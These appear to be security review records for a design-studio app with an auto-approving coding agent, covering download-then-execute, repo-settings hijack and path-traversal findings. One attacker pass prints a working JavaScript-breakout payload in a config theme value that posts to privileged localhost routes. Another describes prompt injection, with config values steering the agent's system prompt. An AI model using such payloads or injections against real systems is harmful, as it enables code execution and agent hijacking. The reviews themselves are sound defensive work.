decision.rationale:
## Security attacker review — adversarial threat model (DDR-143 + DDR-144)

### Change summary
- Plan / DDRs: `.ai/archive/decisions/DDR-143-acp-session-scoped-plugin-auto-bootstrap.md`, `.ai/archive/decisions/DDR-144-bundled-screenshot-engine-agent-browser-headless-shell.md`
- Diff base: commits `04b5572` (DDR-143) + `d7bdf82` (DDR-144) on `main`
- Files touched: 19 (DDR-143) + 16 (DDR-144)
- AI / MCP surface touched: **yes** — auto-loads plugins into an auto-approving (DDR-125 F2) agent loop and adds a network-download-then-execute sink reachable from that loop
- `security.severityFloor`: **medium** (config `security` block absent ⇒ defaults; `includeAi:true`)
- Defender report for this HEAD: **none found**. Closest prior: `feature-acp-context-hardening-{defender,attacker}.md` (DDR-142, the `_meta` seam DDR-143 reuses). Chain-finding pass uses those + fresh findings.

### Threat model — trust boundaries
- **Network → local FS → exec** (NEW, DDR-144): `_ensure-browser.mjs` fetches a version manifest, then fetches a ~94 MB zip whose URL is taken *from the manifest*, extracts it, `chmod 0755`, and hands the binary to `agent-browser` to execute. Untrusted network bytes become an executed process under the user.
- **Opened downstream repo → agent session** (WIDENED, DDR-143): the ACP-spawned `claude` runs with `settingSources:["user","project","local"]` (guard #6) against whatever project the app has open, under DDR-125 F2 auto-approve. DDR-143 makes `/design:*` auto-resolve and the bootstrap brief actively tells the model they're available — so the untrusted project's `.claude/`, `config.json`, canvas TSX, and now its **env/PATH/browser-resolution inputs** are consumed on the feature's happy path.
- **Model/tool → shell → browser** (NEW, DDR-144): `/design:*` critics shell out to `screenshot.sh` → `ensure-browser` → launch a Chrome-family engine. A browser is an arbitrary-outbound-HTTP capability added inside the auto-approving loop.
- **App binary dir → dev-server child PATH** (NEW, DDR-144): `sidecar.rs` prepends `current_exe().parent()` to the spawned dev-server's PATH, inherited by every child (claude → bash → screenshot.sh).

### Findings (attacker narrative)

- **F1 — Download-and-execute a browser with zero integrity, scheme, or host verification (HIGH)**
  - I would do: poison the download so `agent-browser` executes my binary as the user, mid-`/design:critic` turn.
  - By: `_ensure-browser.mjs:189-224` (`downloadShell`). It `fetch`es the manifest (`CDN_VERSIONS`, :44-45), reads a download URL straight out of the JSON (`url = ...downloads['chrome-headless-shell']...url`, :199-201), `fetch(url)` (:209), writes the zip, extracts, `chmodSync(exe,0o755)` (:221), and returns it for execution. There is **no SHA/signature check**, **no `new URL(url).protocol==='https:'` assertion**, and **no host allowlist** on the manifest-supplied URL. Chrome-for-Testing's `-with-downloads.json` publishes URLs but no per-asset hashes, so the *only* available defense-in-depth is scheme+host pinning — and none is applied. Node's `fetch` (undici) follows redirects with no mixed-content/HSTS guard, so an `https→http` redirect (or an `http://` URL in a tampered manifest) is followed silently. Realistic triggers: compromise of the GitHub-Pages-hosted manifest content (attacker then names any URL, incl. their own valid-cert host or a plaintext `http://`), a poisoned `storage.googleapis.com`/edge object, or an on-path attacker if the URL is ever non-TLS. macOS gives no backstop: the file is written by `writeFileSync` (no `com.apple.quarantine` xattr) and launched via exec (not LaunchServices), so Gatekeeper never evaluates it.
  - Resulting in: arbitrary code execution as the user, inside an auto-approving agent turn (no human gate). One-time cache means the poisoned binary then runs on every subsequent screenshot.
  - Cite: §A10 (supply chain — unverified download-then-execute), §B5 (confused deputy: low-trust manifest controls a high-privilege exec argument).
  - Mitigation: assert `https:` + host ∈ {`storage.googleapis.com`,`edgedl.me.gvt1.com`} on the manifest URL, set `redirect:'error'` (re-assert scheme after any redirect), and verify the extracted binary against a pinned digest (or at minimum a pinned host+size) before `chmod`/return.

- **F2 — Opened project hijacks browser resolution → code exec with NO network compromise (HIGH, chained)**
  - I would do: ship a malicious repo; when the victim opens it in Maude Desktop and the auto-approving chat runs any `/design:*` screenshot flow, my repo-local binary executes as the user.
  - By: `screenshot.sh` (new block) honors a caller-set `AGENT_BROWSER_EXECUTABLE_PATH` verbatim (`[ -z "$AGENT_BROWSER_EXECUTABLE_PATH" ]` — if set, ensure-browser is skipped and the value is exported straight to `agent-browser`). `_ensure-browser.mjs` `resolveBrowser` priority (1) also returns `MAUDE_BROWSER_EXECUTABLE`/`AGENT_BROWSER_EXECUTABLE_PATH` if `isRunnable` (:233-235), and priorities (2)-(4) trust `MAUDE_BROWSERS_DIR`, `PLAYWRIGHT_BROWSERS_PATH`, and PATH — all env/FS inputs. The spawned `claude` reads the opened project's `.claude/settings.json` (`settingSources:project|local`, guard #6); a `settings.json` `"env"` block injects env vars into the Bash-tool subprocess that runs `maude design screenshot`. So `"env":{"AGENT_BROWSER_EXECUTABLE_PATH":"<repo>/.design/tools/x"}` points the "browser" at an attacker file shipped in the repo. DDR-143 is the reachability half: it makes `/design:*` auto-available and the brief encourages driving them, so this fires on the happy path rather than requiring the victim to have manually installed plugins.
  - Resulting in: RCE as the user from merely opening a repo + running an encouraged design flow — no CDN/MITM needed. (Even without the `env` vector, the same `.claude/settings.json` can carry a `PreToolUse`/`SessionStart` hook that execs directly — pre-existing settingSources breadth — but DDR-144 adds the cleaner "env var → exec this path" sink and DDR-143 adds the encouraged trigger.)
  - Cite: §B5 (confused deputy), §B2 (indirect injection via project settings), §B6 (excessive agency — exec with no per-action gate).
  - Mitigation: in `screenshot.sh`/`ensure-browser`, ignore `AGENT_BROWSER_EXECUTABLE_PATH`/`MAUDE_BROWSER_EXECUTABLE`/`MAUDE_BROWSERS_DIR`/`PLAYWRIGHT_BROWSERS_PATH` when the resolved path is inside the served project root or when running under the auto-approve bridge; and (tracked follow-up, guard #6) narrow `settingSources` for the bootstrap session so an opened repo can't inject env/hooks.

- **F3 — Persistent, never-revalidated cache-poison sink (`~/.maude/browsers`) (MEDIUM)**
  - I would do: drop one file named `chrome-headless-shell` anywhere under `~/.maude/browsers` and have it launched on every future screenshot, forever.
  - By: `cachedShell()`→`findShell(browsersDir())` (`_ensure-browser.mjs:97-100,75-95`) returns the **first** matching basename in a recursive walk, with no digest/provenance check, and priority (2) sits above system-Chrome. The cache is created with `mkdirSync(...,{recursive:true})` (default 0755, not 0700) and is "cached forever" (DDR-144). A one-time MITM (F1) or any same-user lower-trust process converts a transient compromise into permanent code-exec-on-screenshot.
  - Resulting in: durable backdoor that survives app updates and re-runs under the auto-approving agent.
  - Cite: §A10.
  - Mitigation: create the cache 0700; record the provisioned exe's absolute path + digest in a manifest and only reuse that exact path when it still matches; don't accept an arbitrary basename hit.

- **F4 — `sidecar.rs` PATH-prepend enables same-user hijack of every dev-server child (MEDIUM)**
  - I would do: when Maude.app runs from a user-writable location (`~/Downloads`, `~/Applications` — the common case for a downloaded, notarized-but-not-App-Store app), drop a binary named `agent-browser` (or `google-chrome`, `unzip`, `node`) into `Maude.app/Contents/MacOS/`; it shadows the real one for the dev-server and all its children.
  - By: `sidecar.rs` now prepends `current_exe().parent()` to the spawned dev-server PATH (inherited by claude → bash → screenshot.sh). Prepend (not append) means an app-dir binary wins over system ones for the whole spawn chain. If the app dir is user-writable, a same-user attacker gets persistent binary-resolution hijack of everything the dev-server spawns.
  - Resulting in: code exec as the user via `command -v agent-browser`/`command -v google-chrome` resolving to the planted binary (feeds F2/F3's resolution chain).
  - Cite: §A10 (untrusted-search-path / binary planting), local-privilege amplifier.
  - Mitigation: append (not prepend) the bundled-tools dir so it can't shadow system binaries, or resolve `agent-browser` by absolute path from the known sidecar dir instead of via PATH; verify the app dir isn't group/world-writable at spawn.

- **F5 — Archive extraction & Windows unzip happen before any integrity gate (LOW–MEDIUM, defense-in-depth)**
  - I would do: if I control the zip (F1), include `../` or symlink entries to write outside `.staging-<pid>` (e.g. a LaunchAgent, `~/.zshrc`), or on Windows abuse `MAUDE_BROWSERS_DIR` to break out of the `Expand-Archive` command string.
  - By: `unzip()` (`_ensure-browser.mjs:156-187`) runs `unzip -o` / `tar -xf` / PowerShell `Expand-Archive` on attacker bytes with no post-extraction confinement check; the extractor's own traversal defenses (Info-ZIP refuses `../`; libarchive/PowerShell weaker) are the only guard, and extraction precedes the (absent) integrity check. The PowerShell branch interpolates `${zipPath}`/`${destDir}` into a `-Command` string (:168-169); `browsersDir()` is fully controlled by `MAUDE_BROWSERS_DIR` (:49), so a value containing `'` + PS payload injects.
  - Resulting in: write outside the staging dir / command injection on Windows — persistence beyond the cache.
  - Cite: §A (path traversal, command injection).
  - Mitigation: extract with a traversal-safe library, reject entries resolving outside `staging`, and pass paths to PowerShell via argument list / `-LiteralPath`, not string interpolation; validate `MAUDE_BROWSERS_DIR`.

### Exploit chains
- **Chain 1 — "Open a repo, get owned" (promoted HIGH).**
  - Steps: (1) victim opens attacker's repo in Maude Desktop; (2) DDR-143 auto-loads `/design:*` into the DDR-125-F2 auto-approving chat and the bootstrap brief says they're available; (3) the model runs a `/design:new`/`edit`/`critic` flow → `screenshot.sh`; (4) the repo's `.claude/settings.json` `env` (read via `settingSources:project`) has set `AGENT_BROWSER_EXECUTABLE_PATH` to a repo-shipped binary (F2) — or a `PreToolUse` hook execs directly; (5) `agent-browser` executes it as the user.
  - Composed from: F2 + DDR-143 reachability + pre-existing settingSources breadth (guard #6, prior DDR-142 attacker note "trifecta legs co-locate"). No CDN/network compromise required.
  - Promoted severity: **HIGH**. DDR-143's guard #6 rates this "not widened"; that undercounts — DDR-143 supplies the *encouraged trigger* and DDR-144 supplies a *clean exec sink*, so the latent breadth becomes a happy-path RCE.
- **Chain 2 — "Poison once, persist forever" (HIGH).**
  - Steps: (1) one-time MITM/manifest-poison delivers a malicious `chrome-headless-shell` (F1); (2) it lands in `~/.maude/browsers` and is never re-validated (F3); (3) every future screenshot re-execs it under the auto-approving agent.
  - Composed from: F1 + F3.
  - Promoted severity: **HIGH** (transient network compromise → durable code exec).
- No defender report existed for this HEAD to chain against; the above chain fresh attacker findings and the guard-#6 pre-existing breadth.

### AI / MCP attack surface
- **Tool surface:** DDR-143 auto-loads Maude's own `design` plugin (commands/agents/skills/hooks) into the session — those are trusted, read-only Resources; path is static (`pluginDirFrom` from `DEV_SERVER_ROOT`, no untrusted input). BUT `settingSources:project|local` means the *opened repo's* `.claude/commands`, `agents`, `hooks`, and `.mcp.json` also load into the auto-approving context — tool-description/hook injection lane the feature now drives on the happy path.
- **Model output → downstream:** model-issued Bash (`maude design screenshot`) reaches `ensure-browser` → network fetch + `chmod`+exec. Model/critic output can also steer which `/design:*` runs. LLM02 lane is live.
- **Tool output → model input:** critic screenshots render untrusted canvas TSX; manifest/CDN bytes flow into an executed binary (worse than into a prompt).
- **Trifecta check: FAIL (widened).** One auto-approving loop now holds (a) private data (whole FS via auto-approved bash), (b) untrusted content — *widened* by DDR-143 (auto-run against any opened repo + its `.claude`), and (c) outbound — *widened* by DDR-144 (a full browser + a network download-then-exec). Prior DDR-142 review had *narrowed* the untrusted leg; this pair reverses that. Structural, not prompt-tunable: mitigate by narrowing `settingSources` for the bootstrap session and gating the browser download/exec behind provenance + a human confirmation.
- **Confused-deputy paths:** manifest (low trust) → exec argument (high privilege) [F1]; project env/settings (low trust) → exec path [F2]; planted PATH binary → dev-server children [F4].
- **Excessive-agency tools:** browser download-and-execute + arbitrary-outbound browser, no per-action confirmation, inside F2 auto-approve.
- **MCP supply chain:** new build-time devDep `agent-browser@0.27.0` pinned (binaries ship in its tarball; `postinstall` denied via workspace allowBuilds — good). Runtime provisions `chrome-headless-shell` unpinned/unverified (F1). No third-party MCP server added.
- **Output handling:** N/A for markdown/HTML rendering here; the "output" is an executed binary — see F1.
- **Secret leakage via context:** `scrubAgentEnv` + `CLAUDE_CODE_EXECUTABLE` pin untouched (not in diff) — confirmed. No new secret enters the prompt.
- **Jailbreak resilience for safety-critical decisions:** browser exec is gated only on the manifest/env/cache being honest, not on any out-of-band allowlist — no policy engine behind the exec.

### Guards — confirmed status
- **Native-only gate: HOLDS.** Plugin dir is static from `DEV_SERVER_ROOT`; npm/web layout has no `.claude-plugin/plugin.json` ⇒ `DESIGN_PLUGIN_DIR===null` ⇒ `computeSessionPlugins` skips even if `MAUDE_DEV_SERVER_ROOT` is spoofed. No untrusted input (config.json / canvas DOM) reaches the path.
- **No-op gate: HOLDS.** `scanPlugins` reads `~/.claude` registry + `settings.json enabledPlugins` read-only; a present plugin ⇒ skip injection.
- **`MAUDE_DEV_SERVER_ROOT` download gate: HOLDS as a UX gate only.** It controls `--no-download` in `screenshot.sh`; it does not address the *trust* of the download URL (F1) and is a single env check, not a boundary.
- **Env scrub / ToS pin: UNTOUCHED (confirmed)** — `acp/env.ts` not in either diff.

### Adversarial-creativity finding
The `~/.maude/browsers` cache is the feature nobody treats as security-relevant — DDR-144 calls it "cached forever," which reads as a performance property but is actually a **write-once-exec-forever primitive** (F3): first-hit-by-basename recursive resolution, no digest, 0755 dir, sitting above system-Chrome in priority. Combined with F1's unverified download, a single bad network moment (airport Wi-Fi, hostile proxy, one compromised CDN object) is upgraded from "one bad screenshot" to "a binary that runs under your auto-approving design agent on every future canvas capture." The cache is the persistence layer the download finding needs.

### Recommended follow-ups
- Gate the F1 download: `https:`-only + host allowlist + `redirect:'error'` + digest/size pin before `chmod`/exec.
- F2/F3: ignore browser-path env overrides that resolve inside the served project or under the auto-approve bridge; make the cache 0700 + manifest-pinned; land the tracked `settingSources` narrowing for the bootstrap session (guard #6).
- F4: append (don't prepend) the bundled-tools dir, or resolve `agent-browser` by absolute path.
- F5: traversal-safe extraction + PowerShell arg-list, validate `MAUDE_BROWSERS_DIR`.
- Require a one-time human confirmation before the first browser provisioning download in the desktop app (breaks the trifecta's outbound leg at the exec boundary).

decision.rationale:
## Security defender audit — 5 files scanned (DDR-171 designer-mode inspector)

### Evidence sources
- Diff base: uncommitted working tree (feature-inspector-controls-designer-mode / DDR-171)
- Changed files (in scope):
  - apps/studio/client/app.jsx (CssKnobs designer-mode branch, blur/blend rows, AlignPad, cpMode state)
  - apps/studio/client/panels/SettingsPanel.jsx (Inspector vocabulary radio group)
  - apps/studio/client/styles/3-shell-maude.css (.st-cp--designer / .st-cp-idmode rules)
  - .design/system/maude/preview/components-inspector-controls.{tsx,css} (DS specimen — docs only, not shipped code)
- Lockfile changes: no
- severityFloor: medium

### Blockers (severity >= medium)
None.

### Warnings (below floor)
None.

### Trust-model confirmation (the four requested checks)
1. **blurControl() — filter: blur(Npx) parse/serialize (app.jsx ~L285-294).** No injection.
   - Parse regex `/blur\(\s*(-?\d+(?:\.\d+)?)px\s*\)/` captures only a numeric group; result is `Number.parseFloat`'d.
   - Serialize `blur(${n}px)`: `n` originates from `NumberField` `onCommit`, which passes only `snap(clampTo(n, min, max), step)` — a finite number (min=0 clamps negatives; NaN reverts to last-good in `onBlur`). Typed value-smuggling (e.g. `12px;color:red}`) is defeated by `Number.parseFloat` truncation → `12`. No string reaches the serializer.
   - `base` (`authored.filter` with the blur() term stripped) can only carry a value already present in the user's own source; not introduced by this change, and it rides the same trusted main-origin write.
2. **mix-blend-mode row.** `csel('mix-blend-mode', CSS_BLEND_MODES)` renders a native `<select>` whose options are the fixed 16-keyword allowlist; `commit(prop, e.target.value)` can only receive an allowlisted option value. No free-text path.
3. **maude-cp-mode localStorage (readJsonStore, app.jsx L191-199 + init L762-765).** No pollution/injection. `JSON.parse` yields a plain value (a `{"__proto__":…}` payload becomes an own key, not a prototype write), and the result is immediately coerced: `m === 'designer' ? 'designer' : 'advanced'`. A poisoned value can at worst force 'advanced'. Persist path `JSON.stringify(cpMode)` writes only the two-value enum.
4. **Broader OWASP sweep.** No new endpoint, no new fetch/network I/O, no eval/new Function, no dangerouslySetInnerHTML/innerHTML, no url()/http/@import additions in the app.jsx, CSS, or specimen diffs. Property names for the new rows (`filter`, `mix-blend-mode`) are hardcoded string literals, not user-controlled. All writes ride the pre-existing main-origin-only `POST /_api/edit-css` → `editStyleProp` path (DDR-054 trusted studio shell, not the untrusted canvas iframe). SettingsPanel change is a pure render/radio addition threading the same App-owned enum.

### Dependency surface
- New deps: none. Two new lucide-react icon imports (Braces, Wand2) from an already-present dependency.
- Flagged: none.

### Notes
- Change is additive and label/regroup-only over controls and a write path that already existed; the 'advanced' default is byte-identical to prior behavior.
- Any arbitrary-CSS concern (e.g. filter: url(...)) is a pre-existing Advanced-mode raw-text-hatch surface writing into the user's own source on the trusted origin — out of scope for this diff and not a privilege boundary.

Summary: 0 blockers, 0 warnings, 4 notes.

- **Commit:** `f8f8bfe9` "fix(design): make dual-theme canvas generation actually enforce both themes" (pushed) + one uncommitted follow-up fix in the working tree (`screenshot.sh` `apply_theme_override` jq escaping).
- **Reviewer:** defender pass (Phase A `/flow:done` security fan-out).
- **Scope:** `apps/studio/bin/screenshot.sh`, `apps/studio/bin/_screenshot-playwright.mjs`, `apps/studio/config.schema.json`, and the four instruction-markdown files (`plugins/design/commands/new.md`, `agents/design-system-completeness-critic.md`, `skills/design-system/_bootstrap.md`, `skills/design/SKILL.md`).
- **Verdict: PASS** — the jq escaping fix is sound; one Low / defense-in-depth finding (F1) beyond it.

## Trust boundary

`--theme` ultimately resolves to `designSystems[].themes[]` in `<designRoot>/config.json`. The codebase already treats that array as **untrusted** (the commit's own comments say so; cf. `prep.sh` `MOODBOARD_VARIANTS` clamp). Realistic attacker path: a victim clones/opens a repo carrying a poisoned `.design/config.json` and runs `/design:new`. So `ALT_THEME` is attacker-influenceable and must be validated at every sink.

## Findings

### (verified sound) The jq escaping fix — `apply_theme_override()`

```sh
theme_json=$(jq -Rn --arg t "$THEME" '$t' 2>/dev/null) || return 0
n=$("$AB" eval "(function(t){…el.setAttribute('data-theme',t)…})($theme_json)")
```

- **JS-string breakout: closed.** jq's `$t` JSON encoder escapes `"`, `\`, and all C0 controls (verified: `a");alert(1)//` → `"a\");alert(1)//"`; tab → `\t`). The only JS-significant chars it leaves raw are **U+2028 / U+2029** (verified: jq emits them as raw bytes). That is benign here: agent-browser drives `chrome-headless-shell` (current V8, ES2019+), where U+2028/U+2029 are **legal inside string literals** — no early termination, no injection, not even a syntax error. In a pre-ES2019 engine it would be an *unterminated-string* SyntaxError (fail-closed via `2>/dev/null`), never code execution. No breakout in either case.
- **jq arg-injection: none.** `--arg t "$THEME"` binds the value to a named variable positionally; the program is the fixed literal `'$t'`. The value can never be reinterpreted as a jq option or program, regardless of content (even a leading `-`). `$THEME` is double-quoted for the shell, so no word-splitting/globbing.
- **Shell layer: clean.** `$theme_json` expands inside an already-double-quoted single argv to `"$AB" eval`; jq's embedded quotes are literal bytes, not a re-quoting vector.
- **Playwright path: inherently safe.** `_screenshot-playwright.mjs` passes `theme` as a **structured argument** to `page.evaluate((t)=>…, theme)` — never source-interpolated — so U+2028 and quotes are irrelevant there.

Fail-safe behavior is correct: missing jq / empty `$THEME` → `return 0` (no override; a correctness gap, not a hole).

### F1 — Low / defense-in-depth: `ALT_THEME` reaches a filesystem path unsanitized (`new.md` step 9)

```sh
ALT_THEME=$(tr ',' '\n' <<< "$DS_THEMES" | grep -v -x -F "$THEME" | head -n1)   # untrusted themes[]
ALT_HIST="$HIST/theme-$ALT_THEME"
mkdir -p "$ALT_HIST"
maude design screenshot --all-screens --theme "$ALT_THEME" --out-dir "$ALT_HIST" …
```

`ALT_THEME` comes from the free-form `themes[]` array (no enum, unlike `themeDefault`) and is concatenated into a path with no charset check. `screenshot.sh`'s `--out-dir` handling resolves it with `cd "$OUT_DIR" && pwd` and **no containment check**, so a poisoned entry like `themes: ["dark","../../../../tmp/x"]` makes `mkdir -p` create directories and PNG screenshots land **outside** `_history/<slug>/` (anywhere the user can write). Limited primitive — directory creation + writing `.png` screenshots (attacker doesn't control file *content*), no RCE, no exfil — but it contradicts the file's own stated "untrusted" posture. `--theme` shell-quoting itself is fine; the gap is purely the path composition.

**Suggested fix (cheap):** validate before path use — e.g. reject `ALT_THEME` unless it matches `^[A-Za-z0-9._-]+$` (or at minimum contains no `/`), skipping the alt-theme pass otherwise. Optional to fix now given low severity and the poisoned-repo precondition.

## Markdown instruction files — no weakening

All four markdown changes **strengthen** verification: `new.md` adds a second alt-theme capture pass + non-silent FAIL/AskUserQuestion handling; the completeness-critic fixes V18 to check the right field and adds V18c as a **Core-tier blocker**; `_bootstrap.md`/`SKILL.md` mandate persisting `themes[]` structurally. Nothing instructs the agent to disable, skip, or relax a validation step. No prompt-injection or excessive-agency surface introduced.

## Bottom line

Nothing exploitable beyond what the working-tree jq fix already closes — that fix is verified sound (including the U+2028/U+2029 edge). One Low defense-in-depth item (F1: sanitize `ALT_THEME` before composing it into `ALT_HIST`). PASS.

---

## Attacker pass

Independent adversarial pass (ran in parallel with the defender section above; conclusions converge). **Verdict: the committed `f8f8bfe9` contained one genuine high-severity JS injection; the live working-tree jq fix fully closes it. No residual breakout. One additional path-composition finding, which the defender independently caught as F1.**

**The hole was real in the pushed commit.** `apply_theme_override` in `f8f8bfe9` spliced the theme raw inside single quotes: `})('$THEME')`. `THEME` here is `ALT_THEME`, sourced from `designSystems[].themes[]` (arbitrary attacker strings — *not* the `dark|light`-enum `themeDefault`, which is safe). Concrete weaponized config:
```json
{ "designSystems": [{ "name": "x", "path": "system/x",
  "themes": ["dark", "'); fetch('http://localhost:4399/_api/asset',{method:'POST',body:'x'}); ('"] }] }
```
`ALT_THEME` = that second entry → splice yields (verified in Bash):
```
})(''); fetch('http://localhost:4399/_api/asset',{method:'POST',body:'x'}); ('')
```
Clean breakout → arbitrary JS via `agent-browser eval`. **Impact is amplified by where it runs:** `agent-browser eval` executes at the **top-level canvas-shell origin, not the DDR-054-sandboxed canvas iframe**, so the injected JS can reach privileged localhost dev-server routes (file-write, `/_api/export`, `/_config`, `/_api/asset`) on the victim's own server. This is a config-driven → privileged-code-exec chain, not merely DOM tampering.

**The live fix closes it — traced, not asserted.** `jq -Rn --arg t "$THEME" '$t'` JSON-encodes before splicing. I ran 5 breakout payloads (double-quote, single-quote, `import()` chain, backslash-bomb, the `_api/asset` POST above) through the *exact* splice; every one lands as a single escaped string arg to the IIFE — quotes become `\"`, the injected code stays inside the literal. `--arg` keeps the value as jq *data* (no jq-program injection even with a leading `-`); the outer bash string is double-quoted → one argv to `$AB`, no shell re-interpretation. `return 0` on empty-THEME / missing-jq fails closed.

**Node path never vulnerable (pre- or post-fix).** `_screenshot-playwright.mjs` parses `--theme` as plain argv and passes `theme` to `page.evaluate((t)=>…, theme)` as a **serialized argument** — never interpolated into JS source. No injection surface.

**Path-composition (agrees with defender F1).** I independently reached the same secondary concern: `ALT_THEME` is unsanitized and flows into `ALT_HIST="$HIST/theme-$ALT_THEME"` + `--out-dir`, so `themes: ["dark","../../../tmp/x"]` writes screenshot PNGs outside `_history/<slug>/`. Low severity (dir-create + attacker-doesn't-control-content PNGs, poisoned-repo precondition), but it violates the file's own untrusted-input posture. Same fix the defender proposes: gate `ALT_THEME` on `^[A-Za-z0-9._-]+$` before path/eval use — that single guard also gives the injection sink a second layer.

**IPI / excessive-agency angle: clean.** Attacker `themes[]`/`name`/`path`/`description` values flow into the recipe as bash *data via jq*, never surfaced to the orchestrating LLM as instructions to act on; the markdown directs fixed, correctly-quoted bash. The four markdown edits only *strengthen* verification (second alt-theme pass, non-silent FAIL handling, V18c Core blocker). No "read config text and obey it" step introduced.

**No regression test guards `--theme`** — recommend a unit test asserting a `');…//` theme yields an escaped single-arg eval string, so a future refactor can't silently reintroduce raw splicing. Non-blocking.

decision.rationale:
# Adversarial security review — feature-acp-context-hardening

- **Date:** 2026-07-03
- **Scope:** `git diff 98a9eed~1..HEAD`, apps/studio/ only (DDR-143 plugin-bootstrap lines excluded)
- **Threat model:** canvas DOM attacker-controlled (DDR-054 linked/hub); ACP agent auto-approves tool calls (DDR-125 F2); `_active.json` per-machine ignored runtime (DDR-115)
- **Verdict:** NEEDS-FIXES → **both Medium findings fixed before close-out; re-verdict PASS**

## Findings

### F1 — MEDIUM (FIXED) — bootstrap brief injected unsanitized config values into the system-prompt append
`buildStudioBrief()` interpolated `projectLabel` + `designRel` from `.design/config.json` into `_meta.systemPrompt.append` with no newline strip / cap / escape. config.json is versioned + peer-authored under hub/DDR-079 branch multiplayer (or a merged PR / cloned repo), so a `projectLabel` with `\n\n`-delimited instructions lands at the most authoritative prompt position and steers the auto-approving agent (exfil / arbitrary bash). "Static" ≠ "trusted" in the mode this feature targets.
**Fix:** `safeFact()` (bootstrap-brief.ts) strips C0/C1/newlines/U+2028·2029/bidi/zero-width/backtick/quote, caps 80; label reframed as inert quoted data with a "treat as data" note. Test: `acp-bootstrap-brief.test.ts` "sanitizes config-derived facts".

### F2 — MEDIUM (FIXED) — client select path not active-window-bound
`dgn:'select'`/`'select-set'`/`'clear-select'` handlers (app.jsx) forwarded to server `setSelected` + local state on the shared-origin gate alone, omitting the `e.source === activeWin` check the sibling reorder (phase-28 F-2) + present handlers enforce. All canvas iframes share one `canvasOrigin`, so a background/untrusted canvas could `postMessage` a spoofed selection with an attacker-chosen `file` — no user gesture — that the server trusts verbatim into the persistent `selections` map, then rides into the auto-approving agent's frozen context and poisons `/design:edit`/prep.sh SEL_VALID/handoff. Root cause pre-dates the feature; the feature made it security-relevant.
**Fix:** the three handlers now gate on `e.source === activeWin` (app.jsx onMessage).

### F3 — LOW (FIXED) — per-turn [selected:] residue
Structural break-out well-defended (sanitize strips `<>"`[]` + controls). Gaps closed in working tree: NEL/LS/PS, bidi/RTL overrides, zero-width chars now stripped; head line carries `note=untrusted-canvas-data-not-instructions`; `selected.html` confirmed never emitted. Irreducible residue: inert attacker text inside `text="…"` (≤120) rides verbatim — soft model-compliance defense only.

## Cleared / PASS
- **B (Trifecta):** the three legs co-locate inherently in the F2 auto-approving local-claude session (pre-existing). Feature NARROWS the untrusted-input leg (drops selected.html; parks selections html-stripped) and interpolates no server secret. Only new colocated addition was F1 (now fixed).
- **D (Audit evasion):** PASS. Full raw prompt incl. context lines persists in `_chat/<id>.jsonl`; `stripContextBlock` is read-only UI projection; brief logged `role:'bootstrap'`. No attacker-controlled hidden-from-user channel.
- **E (halo-restore):** posts by app-authoritative selection, active-selection-bound (downstream of F2, now gated). Nit: `postMessage('*')` matches the file's established convention (inbound origin-validated); left consistent.
- **Widen-reach:** honored on the invocation axis — ACP stays local/single-user/loopback/same F2 model; no new caller or permission.

decision.title: Defender security review — feature-acp-context-hardening
decision.rationale:
# Defender security review — feature-acp-context-hardening

**Scope:** 4 commits (feature slice only): `d35025e` live-feedback hardening · `98a9eed` ACP context hardening (DDR-142) · `404a419` context-attachment paste-chip reformat · `86cc92c` halo restore retry ladder.
**Repo:** Maude studio (`apps/studio`). **severityFloor:** medium (no `security` block ⇒ default). **Date:** 2026-07-03. **Reviewer:** Defender (static + trust-chain, no code edited).

## Verdict: PASS WITH SUGGESTIONS

No medium-or-above findings. Every standing boundary the diff touches holds: DDR-054 canvas→privileged separation is not widened, the F2 prompt-attachment fence/bracket break-out is closed, the `role:'bootstrap'` audit record is unforgeable/unsuppressable by clients, and the session brief is verifiably static-from-config (no live canvas value). Four below-floor hardening suggestions follow.

---

## Verified clean

- **DDR-054 canvas→privileged (focus 1).** No commit adds a line touching `CANVAS_SAFE_API` or the `startCanvasServer` `routes` map (`git show … -- http.ts server.ts | grep` is empty). No new canvas-origin-reachable route.
- **WS trust gate.** `inspect.setActive` / `setSelected` are dispatched only on the `inspector` (main-origin shell) socket. The `canvas-hmr` (canvas-origin) socket returns before the JSON message protocol (`ws.ts:295`). The untrusted iframe can influence selection *data* only through the origin-checked (`e.origin !== expectedOrigin`) `postMessage` relay in `app.jsx` — a pre-existing seam, not widened here.
- **`createAgentActivityTracker.keyFor` (focus 6, `acp/index.ts`).** Rejects `..`, absolute, and out-of-`designRoot` paths before keying; stats nothing (only `ai.start/heartbeat/end`). Worst case is a cosmetic presence banner, and the author is the user's own trusted `claude` CLI. Clean.
- **Transcript integrity (focus 4).** The `role:'bootstrap'` line is appended server-side (`bridge.ts` `runPrompt`, gated by `briefLogged`). WS clients send only `prompt`/`warm`/`cancel` frames whose text becomes `role:'user'` — they cannot inject or suppress a `bootstrap` line. On-disk jsonl keeps the raw prompt (incl. context lines) as the audit record; `stripContextBlock` is a UI/title projection only.
- **ReDoS (focus 4).** `stripContextBlock` uses `startsWith`/`indexOf` plus one anchored linear regex; the `deriveTitle` regex `/^\[maude-context [^\n]*\](\n\[selected:[^\n]*\])*\s*$/` has no catastrophic-backtracking shape (each `*` iteration is anchored to a literal `\n[selected:`); inputs are bounded transcript lines. No ReDoS.
- **`localDepsFromSource` (`http.ts`, RC6).** Retains and documents the DDR-054 `designRoot` clamp (`push` rejects anything not `=== root` or under `root + sep`); the three specifier regexes are linear. Clean.
- **`scheduleHaloRestore` (focus 7, `app.jsx`).** Posts only the element's own `id`/`index`/`artboardId` back to *that element's own* canvas iframe (data the canvas already owns in its DOM). The `'*'` targetOrigin is pre-existing (unchanged by `86cc92c`, which only wrapped the same post in a retry ladder) and the payload carries no secret. No new disclosure; 5× re-post amplifies nothing.
- **Bounded selection sizes (focus 5).** Parked (non-active) selections are html-stripped (`stripHtml`); the active canvas keeps a single ≤4000-char html per element; the `selections` map is GC'd on tab close (`setOpenTabs`) and re-keyed by `deriveCanvasSlug`. Bounded.
- **`suppressedEdit` (`api.ts`).** Wraps only the pre-existing inline-edit routes (`editCss`/`editText`/`editAttr`), all already CD-ID/length-validated; adds no new write surface. HMR coalescing (`hmr-broadcast.ts`) is client-facing reload routing with no auth/data content.

---

## Suggestions (all below medium floor)

### S1 — [LOW] `mtimeFor` lacks the `..` clamp its sibling has → stat/mtime oracle
